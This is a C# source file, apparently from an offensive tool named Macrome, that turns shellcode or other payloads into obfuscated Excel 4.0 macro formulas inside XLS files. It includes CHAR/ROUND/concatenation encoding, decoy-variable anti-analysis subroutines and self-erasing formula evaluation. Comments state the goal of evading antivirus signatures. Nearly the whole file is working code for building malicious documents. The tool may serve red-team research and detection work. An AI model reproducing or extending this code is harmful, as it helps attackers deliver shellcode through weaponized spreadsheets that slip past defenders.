using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using b2xtranslator.Spreadsheet.XlsFileFormat;
using b2xtranslator.Spreadsheet.XlsFileFormat.Ptg;
using b2xtranslator.Spreadsheet.XlsFileFormat.Records;
using b2xtranslator.xls.XlsFileFormat.Ptg;
using b2xtranslator.xls.XlsFileFormat.Records;
using b2xtranslator.xls.XlsFileFormat.Structures;

namespace Macrome
{
    public static class FormulaHelper
    {
        public const string TOOLONGMARKER = "<FORMULAISTOOLONG>";

        /// <summary>
        /// Convert a binary payload into a series of cells representing the binary data.
        /// Can be iterated across as described in https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/
        ///
        /// Because of additional binary processing logic added on May 28/29 (the TOOLONGMARKER usage), this no longer needs to identify
        /// if a character is printable or not.
        /// </summary>
        /// <param name="payload"></param>
        /// <returns></returns>
        public static List<string> BuildPayloadMacros(byte[] payload)
        {
            int maxCellSize = 255;
            List<string> macros = new List<string>();
            string curMacroString = "";
            foreach (byte b in payload)
            {
                if (b == (byte) 0)
                {
                    throw new ArgumentException("Payloads with null bytes must use the Base64 Payload Method.");
                }

                curMacroString += (char) b;

                if (curMacroString.Length == maxCellSize)
                {
                    macros.Add(curMacroString);
                    curMacroString = "";
                }
            }

            macros.Add(curMacroString);
            macros.Add("END");
            return macros;
        }
        
        public static List<string> BuildBase64PayloadMacros(byte[] shellcode)
        {
            List<string> base64Strings = new List<string>(); 
            //Base64 expansion is 4/3, and we have 252 bytes to spend, so we can have 189 bytes / cell
            //As an added bonus, 189 is always divisible by 3, so we won't have == padding.
            int maxBytesPerCell = 189;
            for (int offset = 0; offset < shellcode.Length; offset += maxBytesPerCell)
            {
                byte[] guidShellcode;
                if (shellcode.Length - offset < maxBytesPerCell)
                {
                    guidShellcode = shellcode.Skip(offset).ToArray();
                }
                else
                {
                    guidShellcode = shellcode.Skip(offset).Take(maxBytesPerCell).ToArray();
                }
                base64Strings.Add(Convert.ToBase64String(guidShellcode));
            }
            base64Strings.Add("END");
            return base64Strings;
        }

        private static Stack<AbstractPtg> GetGotoForCell(int rw, int col)
        {
            Stack<AbstractPtg> ptgStack = new Stack<AbstractPtg>();
            ptgStack.Push(new PtgRef(rw, col, false, false));
            ptgStack.Push(new PtgFuncVar(FtabValues.GOTO, 1, AbstractPtg.PtgDataType.VALUE));
            return ptgStack;
        }

        private static Stack<AbstractPtg> GetCharSubroutineForInt(ushort charInt, string varName,
            int functionLabelOffset)
        {
            List<AbstractPtg> ptgList = new List<AbstractPtg>();
            ptgList.Add(new PtgFuncVar(FtabValues.IF, 3, AbstractPtg.PtgDataType.VALUE));
            ptgList.Add(new PtgMissArg());
            ptgList.Add(new PtgFuncVar(FtabValues.USERDEFINEDFUNCTION, 1, AbstractPtg.PtgDataType.VALUE));
            ptgList.Add(new PtgName(functionLabelOffset));
            ptgList.Add(new PtgFuncVar(FtabValues.SET_NAME, 2, AbstractPtg.PtgDataType.VALUE));
            ptgList.Add(new PtgInt(charInt));
            ptgList.Add(new PtgStr(varName, true));
            ptgList.Reverse();
            return new Stack<AbstractPtg>(ptgList);
        }
        
        private static Stack<AbstractPtg> GetCharSubroutineWithArgsForInt(ushort charInt, int functionLabelOffset)
        {
            List<AbstractPtg> ptgList = new List<AbstractPtg>();
            ptgList.Add(new PtgFuncVar(FtabValues.USERDEFINEDFUNCTION, 2, AbstractPtg.PtgDataType.VALUE));
            ptgList.Add(new PtgInt(charInt));
            ptgList.Add(new PtgName(functionLabelOffset));
            ptgList.Reverse();
            return new Stack<AbstractPtg>(ptgList);
        }

        private static Stack<AbstractPtg> GetAntiAnalysisCharSubroutineForInt(ushort charInt, string varName, string decoyVarName,
            int functionLabelOffset)
        {
            int numAndArgs = 2;

            List<AbstractPtg> ptgList = new List<AbstractPtg>();
            ptgList.Add(new PtgFuncVar(FtabValues.IF, 3, AbstractPtg.PtgDataType.VALUE));
            ptgList.Add(new PtgMissArg());
            ptgList.Add(new PtgFuncVar(FtabValues.USERDEFINEDFUNCTION, 1, AbstractPtg.PtgDataType.VALUE));
            ptgList.Add(new PtgName(functionLabelOffset));
            ptgList.Add(new PtgFuncVar(FtabValues.AND, numAndArgs, AbstractPtg.PtgDataType.VALUE));

            Random r = new Random();
            int correctArg = r.Next(0, numAndArgs);

            for (int i = 0; i < numAndArgs; i += 1)
            {
                ptgList.Add(new PtgFuncVar(FtabValues.SET_NAME, 2, AbstractPtg.PtgDataType.VALUE));

                if (i == correctArg)
                {
                    ptgList.Add(new PtgInt(charInt));
                    ptgList.Add(new PtgStr(varName, true));
                }
                else
                {
                    ptgList.Add(new PtgInt((ushort)r.Next(1,255)));
                    ptgList.Add(new PtgStr(decoyVarName, true));
                }


            }
            ptgList.Reverse();
            return new Stack<AbstractPtg>(ptgList);
        }
        
        public static Formula CreateCharInvocationFormulaForLblIndex(ushort rw, ushort col, int lblIndex)
        {
            List<AbstractPtg> ptgList = new List<AbstractPtg>();
            ptgList.Add(new PtgFuncVar(FtabValues.RETURN, 1, AbstractPtg.PtgDataType.VALUE));
            ptgList.Add(new PtgFunc(FtabValues.CHAR, AbstractPtg.PtgDataType.VALUE));
            ptgList.Add(new PtgName(lblIndex));
            ptgList.Reverse();
            Stack<AbstractPtg> ptgStack = new Stack<AbstractPtg>(ptgList);

            Formula charInvocationFormula = new Formula(new Cell(rw, col), FormulaValue.GetEmptyStringFormulaValue(), true, new CellParsedFormula(ptgStack));
            return charInvocationFormula;
        }

        public static List<Formula> CreateCharFunctionWithArgsForLbl(ushort rw, ushort col, int var1Lblindex, string var1Lblname)
        {
            // =ARGUMENT("var1",1)
            List<AbstractPtg> ptgList = new List<AbstractPtg>();
            ptgList.Add(new PtgFuncVar(FtabValues.ARGUMENT, 2, AbstractPtg.PtgDataType.VALUE));
            ptgList.Add(new PtgInt(1));
            ptgList.Add(new PtgStr(var1Lblname, true, AbstractPtg.PtgDataType.VALUE));
            ptgList.Reverse();
            Stack<AbstractPtg> ptgStack = new Stack<AbstractPtg>(ptgList);
            Formula charFuncArgFormula = new Formula(new Cell(rw, col), FormulaValue.GetEmptyStringFormulaValue(), true,
                new CellParsedFormula(ptgStack));

            // =RETURN(CHAR(var1))
            ptgList = new List<AbstractPtg>();
            ptgList.Add(new PtgFuncVar(FtabValues.RETURN, 1, AbstractPtg.PtgDataType.VALUE));
            ptgList.Add(new PtgFunc(FtabValues.CHAR, AbstractPtg.PtgDataType.VALUE));
            ptgList.Add(new PtgName(var1Lblindex));
            ptgList.Reverse();     
            ptgStack = new Stack<AbstractPtg>(ptgList);
            Formula charInvocationReturnFormula = new Formula(new Cell(rw+1, col), FormulaValue.GetEmptyStringFormulaValue(), true, new CellParsedFormula(ptgStack));
            return new List<Formula>() {charFuncArgFormula, charInvocationReturnFormula};
        }

        public static List<Formula> CreateFormulaInvocationFormulaForLblIndexes(ushort rw, ushort col, string var1Lblname, string var2Lblname, int var1Lblindex, int var2Lblindex)
        {
            // =ARGUMENT("var1",2)
            List<AbstractPtg> ptgList = new List<AbstractPtg>();
            ptgList.Add(new PtgFuncVar(FtabValues.ARGUMENT, 2, AbstractPtg.PtgDataType.VALUE));
            ptgList.Add(new PtgInt(2));
            ptgList.Add(new PtgStr(var1Lblname, true, AbstractPtg.PtgDataType.VALUE));
            ptgList.Reverse();
            Stack<AbstractPtg> ptgStack = new Stack<AbstractPtg>(ptgList);
            Formula formFuncArg1Formula = new Formula(new Cell(rw, col), FormulaValue.GetEmptyStringFormulaValue(), true,
                new CellParsedFormula(ptgStack));
            
            // =ARGUMENT("var2",8)
            ptgList = new List<AbstractPtg>();
            ptgList.Add(new PtgFuncVar(FtabValues.ARGUMENT, 2, AbstractPtg.PtgDataType.VALUE));
            ptgList.Add(new PtgInt(8));
            ptgList.Add(new PtgStr(var2Lblname, true, AbstractPtg.PtgDataType.VALUE));
            ptgList.Reverse();
            ptgStack = new Stack<AbstractPtg>(ptgList);
            Formula formFuncArg2Formula = new Formula(new Cell(rw+1, col), FormulaValue.GetEmptyStringFormulaValue(), true,
                new CellParsedFormula(ptgStack));

            // =FORMULA(var1,var2)
            ptgList = new List<AbstractPtg>();
            ptgList.Add(new PtgFuncVar(CetabValues.FORMULA, 2, AbstractPtg.PtgDataType.VALUE));
            ptgList.Add(new PtgName(var2Lblindex));
            ptgList.Add(new PtgName(var1Lblindex));
            ptgList.Reverse();     
            ptgStack = new Stack<AbstractPtg>(ptgList);
            Formula formulaInvocationFunction = new Formula(new Cell(rw+2, col), FormulaValue.GetEmptyStringFormulaValue(), true, new CellParsedFormula(ptgStack));
            
            // =RETURN()
            ptgList = new List<AbstractPtg>();
            ptgList.Add(new PtgFuncVar(FtabValues.RETURN, 0, AbstractPtg.PtgDataType.VALUE));
            ptgStack = new Stack<AbstractPtg>(ptgList);
            Formula returnFormula = new Formula(new Cell(rw+3, col), FormulaValue.GetEmptyStringFormulaValue(), true, new CellParsedFormula(ptgStack));

            return new List<Formula>() {formFuncArg1Formula, formFuncArg2Formula, formulaInvocationFunction, returnFormula};
        }
        
        public static List<Formula> CreateFormulaEvalInvocationFormulaForLblIndexes(ushort rw, ushort col, string var1Lblname, int var1Lblindex)
        {
            // =ARGUMENT("var1",2)
            List<AbstractPtg> ptgList = new List<AbstractPtg>();
            ptgList.Add(new PtgFuncVar(FtabValues.ARGUMENT, 2, AbstractPtg.PtgDataType.VALUE));
            ptgList.Add(new PtgInt(2));
            ptgList.Add(new PtgStr(var1Lblname, true, AbstractPtg.PtgDataType.VALUE));
            ptgList.Reverse();
            Stack<AbstractPtg> ptgStack = new Stack<AbstractPtg>(ptgList);
            Formula formFuncArg1Formula = new Formula(new Cell(rw, col), FormulaValue.GetEmptyStringFormulaValue(), true,
                new CellParsedFormula(ptgStack));
            
            // =FORMULA(var1,nextRow)
            ptgList = new List<AbstractPtg>();
            ptgList.Add(new PtgFuncVar(CetabValues.FORMULA, 2, AbstractPtg.PtgDataType.VALUE));
            ptgList.Add(new PtgRef(rw+2,col,false,false));
            ptgList.Add(new PtgName(var1Lblindex));
            ptgList.Reverse();     
            ptgStack = new Stack<AbstractPtg>(ptgList);
            Formula formulaInvocationFunction = new Formula(new Cell(rw+1, col), FormulaValue.GetEmptyStringFormulaValue(), true, new CellParsedFormula(ptgStack));

            // Formula Written by Previous Line
            
            // =FORMULA("",prevRow)
            ptgList = new List<AbstractPtg>();
            ptgList.Add(new PtgFuncVar(CetabValues.FORMULA, 2, AbstractPtg.PtgDataType.VALUE));
            ptgList.Add(new PtgRef(rw+2,col,false,false));
            ptgList.Add(new PtgStr(""));
            ptgList.Reverse();     
            ptgStack = new Stack<AbstractPtg>(ptgList);
            Formula formulaRemovalFunction = new Formula(new Cell(rw+3, col), FormulaValue.GetEmptyStringFormulaValue(), true, new CellParsedFormula(ptgStack));

            
            // =RETURN()
            ptgList = new List<AbstractPtg>();
            ptgList.Add(new PtgFuncVar(FtabValues.RETURN, 0, AbstractPtg.PtgDataType.VALUE));
            ptgStack = new Stack<AbstractPtg>(ptgList);
            Formula returnFormula = new Formula(new Cell(rw+4, col), FormulaValue.GetEmptyStringFormulaValue(), true, new CellParsedFormula(ptgStack));

            return new List<Formula>() {formFuncArg1Formula, formulaInvocationFunction, formulaRemovalFunction, returnFormula};
        }


        public static Stack<AbstractPtg> GetAlertPtgStack(string alertString)
        {
            Stack<AbstractPtg> ptgStack = new Stack<AbstractPtg>();

            ptgStack.Push(new PtgStr("Hello World!", false, AbstractPtg.PtgDataType.VALUE));
            ptgStack.Push(new PtgInt(2, AbstractPtg.PtgDataType.VALUE));
            ptgStack.Push(new PtgFuncVar(CetabValues.ALERT, 2, AbstractPtg.PtgDataType.VALUE));

            return ptgStack;
        }

        public static Formula GetGotoFormulaForCell(int rw, int col, int dstRw, int dstCol, int ixfe = 15)
        {
            Cell curCell = new Cell(rw, col, ixfe);
            Stack<AbstractPtg> ptgStack = GetGotoForCell(dstRw, dstCol);
            Formula gotoFormula = new Formula(curCell, FormulaValue.GetEmptyStringFormulaValue(), true, new CellParsedFormula(ptgStack));
            return gotoFormula;
        }


        public static Stack<AbstractPtg> GetCharPtgForInt(ushort charInt)
        {
            Stack<AbstractPtg> ptgStack = new Stack<AbstractPtg>();

            ptgStack.Push(new PtgInt(charInt));

            //An alternate way to invoke the CHAR function by using PtgFuncVar instead
            //TODO [Stealth] this is sig-able and we'll want to do something more generalized than abuse the fact AV doesn't pay attention
            ptgStack.Push(new PtgFuncVar(FtabValues.CHAR, 1, AbstractPtg.PtgDataType.VALUE));
            // ptgStack.Push(new PtgFunc(FtabValues.CHAR, AbstractPtg.PtgDataType.VALUE));

            return ptgStack;
        }

        public static Stack<AbstractPtg> GetObfuscatedCharPtgForInt(ushort charInt)
        {
            Stack<AbstractPtg> ptgStack = new Stack<AbstractPtg>();

            Random r = new Random();

            //Allegedly we max out at 0xFF for column values...could be a nice accidental way of creating alternate references though
            //Generate a random PtgRef to start the stack - if it's an empty cell, this is a no-op if we end with a PtgConcat
            ptgStack.Push(new PtgRef(r.Next(1000, 2000), r.Next(0x20, 0x9F), false, false, AbstractPtg.PtgDataType.VALUE));

            ptgStack.Push(new PtgNum(charInt));
            ptgStack.Push(new PtgInt(0));

            ptgStack.Push(new PtgFunc(FtabValues.ROUND, AbstractPtg.PtgDataType.VALUE));

            //An alternate way to invoke the CHAR function by using PtgFuncVar instead
            // ptgStack.Push(new PtgFuncVar(FtabValues.CHAR, 1, AbstractPtg.PtgDataType.VALUE));
            ptgStack.Push(new PtgFunc(FtabValues.CHAR, AbstractPtg.PtgDataType.VALUE));

            //Merge the random PtgRef we generate at the beginning
            ptgStack.Push(new PtgConcat());
            return ptgStack;
        }

        public static List<BiffRecord> ConvertBase64StringsToRecords(List<string> base64Strings, int rwStart,
            int colStart)
        {
            List<BiffRecord> records = new List<BiffRecord>();

            int curRow = rwStart;
            int curCol = colStart;

            foreach (var base64String in base64Strings)
            {
                records.AddRange(GetRecordsForString(base64String, curRow, curCol));
                curRow += 1;
            }

            return records;
        }
        
        public static List<BiffRecord> GetRecordsForString(string str, int rw, int col)
        {
            List<BiffRecord> records = new List<BiffRecord>();
            Stack<AbstractPtg> ptgStack = new Stack<AbstractPtg>();
            ptgStack.Push(new PtgStr("A", false));
            Cell targetCell = new Cell(rw, col);
            BiffRecord record = new Formula(targetCell, FormulaValue.GetStringFormulaValue(), false,
                new CellParsedFormula(ptgStack));
            records.Add(record);
            records.Add(new STRING(str, false));
            return records;
        }
        
        public static List<BiffRecord> ConvertStringsToRecords(List<string> strings, int rwStart, int colStart, int dstRwStart, int dstColStart,
            int ixfe = 15, SheetPackingMethod packingMethod = SheetPackingMethod.ObfuscatedCharFunc)
        {
            List<BiffRecord> formulaList = new List<BiffRecord>();

            int curRow = rwStart;
            int curCol = colStart;

            int dstCurRow = dstRwStart;
            int dstCurCol = dstColStart;

            //TODO [Anti-Analysis] Break generated formula apart with different RUN()/GOTO() actions 
            foreach (string str in strings)
            {
                string[] rowStrings = str.Split(MacroPatterns.MacroColumnSeparator);
                List<BiffRecord> stringFormulas = new List<BiffRecord>();
                for (int colOffset = 0; colOffset < rowStrings.Length; colOffset += 1)
                {
                   //Skip empty strings
                   if (rowStrings[colOffset].Trim().Length == 0)
                   {
                       continue;
                   }

                   string rowString = rowStrings[colOffset];

                   int maxCellLength = 0x2000;
                   //One Char can take up to 8 bytes
                   int concatCharLength = 8;

                   List<BiffRecord> formulas;

                   if ((rowString.Length * concatCharLength) > maxCellLength)
                   {
                       //Given that the max actual length for a cell is 255 bytes, this is unlikely to ever be used,
                       //but the logic is being kept in case there are edge cases or there ends up being a workaround
                       //for the limitation
                       List<string> chunks = rowString.SplitStringIntoChunks(250);
                       formulas = ConvertChunkedStringToFormulas(chunks, curRow, curCol, dstCurRow, dstCurCol, ixfe, packingMethod);
                   }
                   else
                   {
                       string curString = rowStrings[colOffset];
                       
                       //If the string is technically 255 bytes, but needs additional encoding, we break it into two parts:
                       //ex: "=123456" becomes "=CHAR(=)&CHAR(1)&CHAR(2)&CHAR(3)&RandomCell" and =RandomVarName&"456"
                       if (curString.StartsWith(FormulaHelper.TOOLONGMARKER))
                       {
                           formulas = ConvertMaxLengthStringToFormulas(curString, curRow, curCol, dstCurRow,
                               dstCurCol + colOffset, ixfe, packingMethod);
                       }
                       else
                       {
                           formulas = ConvertStringToFormulas(rowStrings[colOffset], curRow, curCol, dstCurRow, dstCurCol + colOffset, ixfe, packingMethod);
                       }
                   }

                   stringFormulas.AddRange(formulas);

                   //If we're starting to get close to the max rowcount (0xFFFF in XLS), then move to the next row
                   if (curRow > 0xE000)
                   {
                       Formula nextRowFormula = FormulaHelper.GetGotoFormulaForCell(curRow + formulas.Count, curCol, 0, curCol + 1);
                       stringFormulas.Add(nextRowFormula);

                       curRow = 0;
                       curCol += 1;
                   }
                   else
                   {
                       curRow += formulas.Count;
                   }
                }

                dstCurRow += 1;

                formulaList.AddRange(stringFormulas);
            }

            return formulaList;
        }

        public static List<BiffRecord> ConvertMaxLengthStringToFormulas(string curString, int rwStart, int colStart, int dstRw, int dstCol, int ixfe = 15, SheetPackingMethod packingMethod = SheetPackingMethod.ObfuscatedCharFunc)
        {
            string actualString =
                new string(curString.Skip(FormulaHelper.TOOLONGMARKER.Length).ToArray());

            string earlyString = new string(actualString.Take(16).ToArray());
            string remainingString = new string(actualString.Skip(16).ToArray());
            List<BiffRecord> formulas = new List<BiffRecord>();

            int curRow = rwStart;
            int curCol = colStart;


            Random r = new Random();
            int rndCol = r.Next(0x90, 0x9F);
            int rndRw = r.Next(0xF000, 0xF800);
            formulas.AddRange(ConvertStringToFormulas(remainingString, curRow, curCol, rndRw, rndCol, ixfe, packingMethod));

            curRow += formulas.Count;

            Cell remainderCell = new Cell(rndRw, rndCol);
            List<Cell> createdCells = new List<Cell>();

            //Create a formula string like 
            //"=CHAR(123)&CHAR(234)&CHAR(345)&R[RandomRw]C[RandomCol]";
            //To split the 255 bytes into multiple cells - the first few bytes are CHAR() encoded, the remaining can be wrapped in ""s
            string macroString = "=";

            foreach (char c in earlyString)
            {
                macroString += string.Format("CHAR({0})&", Convert.ToUInt16(c));
            }
            macroString += string.Format("R{0}C{1}",rndRw + 1, rndCol + 1);
            createdCells.Add(remainderCell);

            List<BiffRecord> mainFormula = ConvertStringToFormulas(macroString, curRow, curCol, dstRw, dstCol, ixfe, packingMethod);
            formulas.AddRange(mainFormula);

            return formulas;
        }



        public static List<BiffRecord> ConvertChunkedStringToFormulas(List<string> chunkedString, int rwStart, int colStart, int dstRw,
            int dstCol, int ixfe = 15, SheetPackingMethod packingMethod = SheetPackingMethod.ObfuscatedCharFunc)
        {
            bool instaEval = false;
            if (chunkedString[0].StartsWith(MacroPatterns.InstaEvalMacroPrefix))
            {
                if (packingMethod != SheetPackingMethod.ArgumentSubroutines)
                {
                    throw new NotImplementedException("Must use ArgumentSubroutines Sheet Packing for InstaEval");
                }
                instaEval = true;
                chunkedString[0] = chunkedString[0].Replace(MacroPatterns.InstaEvalMacroPrefix, "");
            }
            
            List<BiffRecord> formulaList = new List<BiffRecord>();
            
            List<Cell> concatCells = new List<Cell>();

            int curRow = rwStart;
            int curCol = colStart;

            foreach (string str in chunkedString)
            {
                List<Cell> createdCells = new List<Cell>();

                //TODO [Stealth] Perform additional operations to obfuscate static =CHAR(#) signature
                foreach (char c in str)
                {
                    Stack<AbstractPtg> ptgStack = GetPtgStackForChar(c, packingMethod);

                    ushort charValue = Convert.ToUInt16(c);
                    if (charValue > 0xFF)
                    {
                        ptgStack = new Stack<AbstractPtg>();
                        ptgStack.Push(new PtgStr("" + c, true));
                    }
                    Cell curCell = new Cell(curRow, curCol, ixfe);
                    createdCells.Add(curCell);
                    Formula charFrm = new Formula(curCell, FormulaValue.GetEmptyStringFormulaValue(), true, new CellParsedFormula(ptgStack));
                    byte[] formulaBytes = charFrm.GetBytes();
                    formulaList.Add(charFrm);
                    curRow += 1;
                }

                Formula concatFormula = BuildConcatCellsFormula(createdCells, curRow, curCol);
                concatCells.Add(new Cell(curRow, curCol, ixfe));
                formulaList.Add(concatFormula);
                curRow += 1;
            }

            Formula concatConcatFormula = BuildConcatCellsFormula(concatCells, curRow, curCol);
            formulaList.Add(concatConcatFormula);
            curRow += 1;

            PtgRef srcCell = new PtgRef(curRow - 1, curCol, false, false, AbstractPtg.PtgDataType.VALUE);
            
            Random r = new Random();
            int randomBitStuffing = r.Next(1, 32) * 0x100;

            PtgRef destCell = new PtgRef(dstRw, dstCol + randomBitStuffing, false, false);

            Formula formula = GetFormulaInvocation(srcCell, destCell, curRow, curCol, packingMethod, instaEval);
            formulaList.Add(formula);

            return formulaList;
        }

        public static Stack<AbstractPtg> GetPtgStackForChar(char c, SheetPackingMethod packingMethod)
        {
            switch (packingMethod)
            {
                case SheetPackingMethod.ObfuscatedCharFunc: 
                    return  GetObfuscatedCharPtgForInt(Convert.ToUInt16(c));
                case SheetPackingMethod.ObfuscatedCharFuncAlt:
                    return GetCharPtgForInt(Convert.ToUInt16(c));
                case SheetPackingMethod.CharSubroutine:
                    //For now assume the appropriate label is at offset 1 (first lbl record)
                    return GetCharSubroutineForInt(Convert.ToUInt16(c), UnicodeHelper.VarName, 1);
                case SheetPackingMethod.AntiAnalysisCharSubroutine:
                    //For now assume the appropriate label is at offset 1 (first lbl record)
                    return GetAntiAnalysisCharSubroutineForInt(Convert.ToUInt16(c), UnicodeHelper.VarName, UnicodeHelper.DecoyVarName, 1);
                case SheetPackingMethod.ArgumentSubroutines:
                    //For now assume the appropriate label is at offset 1 (first lbl record)
                    return GetCharSubroutineWithArgsForInt(Convert.ToUInt16(c), 1);
                default:
                    throw new NotImplementedException();
            }
        }

        private static List<BiffRecord> ConvertStringToFormulas(string str, int rwStart, int colStart, int dstRw, int dstCol, int ixfe = 15, SheetPackingMethod packingMethod = SheetPackingMethod.ObfuscatedCharFunc)
        {
            List<BiffRecord> formulaList = new List<BiffRecord>();
            List<Cell> createdCells = new List<Cell>();

            int curRow = rwStart;
            int curCol = colStart;

            bool instaEval = false;
            if (str.StartsWith(MacroPatterns.InstaEvalMacroPrefix))
            {
                if (packingMethod != SheetPackingMethod.ArgumentSubroutines)
                {
                    throw new NotImplementedException("Must use ArgumentSubroutines Sheet Packing for InstaEval");
                }
                instaEval = true;
                str = str.Replace(MacroPatterns.InstaEvalMacroPrefix, "");
            }

            
            List<Formula> charFormulas = GetCharFormulasForString(str, curRow, curCol, packingMethod);
            formulaList.AddRange(charFormulas);
            curRow += charFormulas.Count;
            createdCells = charFormulas.Select(formula => new Cell(formula.rw, formula.col, ixfe)).ToList();
            
            List<BiffRecord> formulaInvocationRecords =
                BuildFORMULAFunctionCall(createdCells, curRow, curCol, dstRw, dstCol, packingMethod, instaEval);

            formulaList.AddRange(formulaInvocationRecords);

            return formulaList;
        }

        private static List<Formula> GetCharFormulasForString(string str, int curRow, int curCol,
            SheetPackingMethod packingMethod)
        {
            List<Formula> charFormulas = new List<Formula>();

            if (packingMethod == SheetPackingMethod.ArgumentSubroutines)
            {
                Formula macroFormula = ConvertStringToMacroFormula(str, curRow, curCol);
                charFormulas.Add(macroFormula);
            }
            else
            {
                foreach (char c in str)
                {
                    Stack<AbstractPtg> ptgStack = GetPtgStackForChar(c, packingMethod);

                    ushort charValue = Convert.ToUInt16(c);
                    if (charValue > 0xFF)
                    {
                        ptgStack = new Stack<AbstractPtg>();
                        ptgStack.Push(new PtgStr("" + c, true));
                    }
                    Cell curCell = new Cell(curRow, curCol);
                    Formula charFrm = new Formula(curCell, FormulaValue.GetEmptyStringFormulaValue(), true, new CellParsedFormula(ptgStack));
                    byte[] formulaBytes = charFrm.GetBytes();
                    charFormulas.Add(charFrm);
                    curRow += 1;
                }
            }

            return charFormulas;
        }

        private static Formula GetFormulaInvocation(PtgRef srcCell, PtgRef destCell, int curRow, int curCol, SheetPackingMethod packingMethod, bool instaEval)
        {
            Stack<AbstractPtg> formulaPtgStack = new Stack<AbstractPtg>();

            if (packingMethod == SheetPackingMethod.ArgumentSubroutines)
            {
                if (instaEval == false)
                {
                    // The Formula Call is currently hardcoded to index 2
                    formulaPtgStack.Push(new PtgName(2));
                }
                else
                {
                    // The Instant Evaluation Formula Call is currently hardcoded to index 6
                    formulaPtgStack.Push(new PtgName(6));
                }
            }
            
            formulaPtgStack.Push(srcCell);
            formulaPtgStack.Push(destCell);

            if (packingMethod == SheetPackingMethod.ArgumentSubroutines)
            {
                PtgFuncVar funcVar = new PtgFuncVar(FtabValues.USERDEFINEDFUNCTION, 3, AbstractPtg.PtgDataType.VALUE);
                formulaPtgStack.Push(funcVar);                
            }
            else
            {
                PtgFuncVar funcVar = new PtgFuncVar(CetabValues.FORMULA, 2);
                formulaPtgStack.Push(funcVar);
            }
            
            Formula formula = new Formula(new Cell(curRow, curCol), FormulaValue.GetEmptyStringFormulaValue(), true, new CellParsedFormula(formulaPtgStack));
            return formula;
        }

        private static List<BiffRecord> BuildFORMULAFunctionCall(List<Cell> createdCells, int curRow, int curCol, int dstRw, int dstCol, SheetPackingMethod packingMethod, bool instaEval)
        {
            List<BiffRecord> formulaList = new List<BiffRecord>();

            Formula concatFormula = BuildConcatCellsFormula(createdCells, curRow, curCol);
            formulaList.Add(concatFormula);
            curRow += 1;
        
            PtgRef srcCell = new PtgRef(curRow - 1, curCol, false, false, AbstractPtg.PtgDataType.VALUE);
            
            Random r = new Random();
            int randomBitStuffing = r.Next(1, 32) * 0x100;

            PtgRef destCell = new PtgRef(dstRw, dstCol + randomBitStuffing, false, false);

            Formula formula = GetFormulaInvocation(srcCell, destCell, curRow, curCol, packingMethod, instaEval);
            formulaList.Add(formula);

            return formulaList;
        }

        public static Formula ConvertStringToMacroFormula(string formula, int frmRow, int frmCol)
        {
            Stack<AbstractPtg> ptgStack = new Stack<AbstractPtg>();
            int charactersPushed = 0;
            foreach (char c in formula)
            {
                PtgConcat ptgConcat = new PtgConcat();
                
                Stack<AbstractPtg> charStack = GetCharSubroutineWithArgsForInt(Convert.ToUInt16(c), 1);
                charStack.Reverse().ToList().ForEach(item => ptgStack.Push(item));
                charactersPushed += 1;
                if (charactersPushed > 1)
                {
                    ptgStack.Push(ptgConcat);
                }
            }
            
            Formula f = new Formula(new Cell(frmRow, frmCol), FormulaValue.GetEmptyStringFormulaValue(), true, new CellParsedFormula(ptgStack));
            return f;
        }

        public static Formula BuildConcatCellsFormula(List<Cell> cells, int frmRow, int frmCol, int ixfe = 15)
        {
            Stack<AbstractPtg> ptgStack = new Stack<AbstractPtg>();

            Cell firstCell = cells.First();
            List<Cell> remainingCells = cells.TakeLast(cells.Count - 1).ToList();
            PtgRef cellRef = new PtgRef(firstCell.Rw, firstCell.Col, false, false, AbstractPtg.PtgDataType.VALUE);
            ptgStack.Push(cellRef);

            //TODO [Stealth] Use alternate concat methods beyond PtgConcat, for example CONCATENATE via PtgFuncVar
            foreach (Cell cell in remainingCells)
            {
                PtgConcat ptgConcat = new PtgConcat();
                PtgRef appendedCellRef = new PtgRef(cell.Rw, cell.Col, false, false, AbstractPtg.PtgDataType.VALUE);
                ptgStack.Push(appendedCellRef);
                ptgStack.Push(ptgConcat);
            }

            Formula f = new Formula(new Cell(frmRow, frmCol, ixfe), FormulaValue.GetEmptyStringFormulaValue(), true, new CellParsedFormula(ptgStack));
            return f;
        }

       public static List<BiffRecord> GetFormulaRecords(Formula f)
        {
            if (f.RequiresStringRecord() == false)
            {
                return new List<BiffRecord>() {f};
            }
            
            return new List<BiffRecord>()
            {
                f, 
                new STRING("\u0000", true)
            };
        }
    }
}
